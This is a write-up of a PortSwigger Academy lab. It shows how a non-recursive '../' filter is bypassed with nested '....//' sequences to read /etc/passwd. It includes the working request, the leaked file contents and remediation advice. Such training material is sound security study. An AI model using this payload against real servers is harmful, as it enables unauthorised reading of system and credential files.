# File Path Traversal — Traversal Sequences Stripped Non-Recursively

**PortSwigger Web Security Academy** | Topic: Path Traversal | Difficulty: Practitioner
**Status:** ✅ Solved

---

## Lab Description

This lab contains a path traversal vulnerability in the display of product images. The application attempts to defend against path traversal attacks by stripping path traversal sequences from the user-supplied `filename` parameter before using it. However, this sanitization is implemented **non-recursively**, meaning it only removes one occurrence of a traversal sequence rather than repeating the check until no sequences remain.

**Objective:** Retrieve the contents of `/etc/passwd`.

---

## Vulnerability Overview

A common (but flawed) mitigation against path traversal is to strip sequences like `../` from user input using a single-pass filter, e.g.:

```
filename = filename.replace("../", "")
```

The flaw: this only removes the pattern **once per pass**. If an attacker embeds a traversal sequence *inside* another traversal sequence, the single-pass strip leaves a valid `../` behind once the inner one is removed.

For example, the input:

```
....//
```

When `../` (or `./`) is stripped once, it collapses down to:

```
../
```

which is a valid traversal sequence — the filter effectively re-creates the exact payload it was trying to block, because it doesn't re-check its own output.

---

## Methodology

### 1. Identify the vulnerable parameter
The application loads product images via a request like:

```
GET /image?filename=example.jpg
```

The `filename` parameter is a strong candidate for path traversal since it's used to reference a file on the server's filesystem.

### 2. Intercept the request with Burp Suite
Using Burp Suite's browser, the image request was intercepted in **Proxy** and sent to **Repeater** for manipulation and replay.

### 3. Attempt a standard traversal payload
A normal payload such as:

```
GET /image?filename=../../../etc/passwd
```

is stripped by the application's non-recursive filter and fails.

### 4. Bypass the filter with a nested sequence
To defeat the single-pass sanitization, each `../` was replaced with a nested sequence that still resolves to `../` after one round of stripping:

```
GET /image?filename=....//....//....//etc/passwd HTTP/2
```

Sent from Repeater:

**Request:**
```http
GET /image?filename=....//....//....//etc/passwd HTTP/2
Host: 0a0500b004e7f103806e5deb00ff0092.web-security-academy.net
Cookie: session=6N4t0zCeqYA90K7P1XIts04gmaCcbBRp
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: https://0a0500b004e7f103806e5deb00ff0092.web-security-academy.net/
```

### 5. Result

The server returned a `200 OK` with `Content-Type: image/jpeg` (the endpoint always sets this header regardless of actual content) and the raw contents of `/etc/passwd` in the response body:

**Response (truncated):**
```http
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
...
```

The lab was marked **Solved**.

---

## Root Cause

The application's input sanitization removed traversal sequences in a single pass instead of looping until the input stabilized (i.e., until no further sequences could be stripped). This is a classic **incomplete blacklist / improper sanitization** flaw (CWE-22 / CWE-23), distinct from filters that fail due to encoding tricks — here the bypass relies purely on the sanitization logic being non-recursive.

---

## Evidence

| Step | Screenshot |
|---|---|
| Burp Repeater request/response showing `/etc/passwd` disclosure | `screenshots/01-burp-repeater-passwd-disclosure.png` |
| Lab in "Not solved" state before the attack | `screenshots/02-lab-not-solved.png` |
| Lab in "Solved" state after the attack | `screenshots/03-lab-solved.png` |

---

## Remediation

- Avoid constructing filesystem paths directly from user input.
- Validate the filename against an **allowlist** of known-good values (e.g., a fixed set of image IDs mapped server-side to file paths).
- If sanitization is unavoidable, strip traversal sequences **iteratively** until the string no longer changes, rather than in a single pass — or better, canonicalize the resolved path (e.g., `realpath`/`Path.resolve()`) and verify it still falls within the intended base directory before use.
- Run the application with a low-privilege service account and restrict filesystem permissions so sensitive files like `/etc/passwd` aren't readable even if traversal occurs.

---

## References

- [PortSwigger Web Security Academy – Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
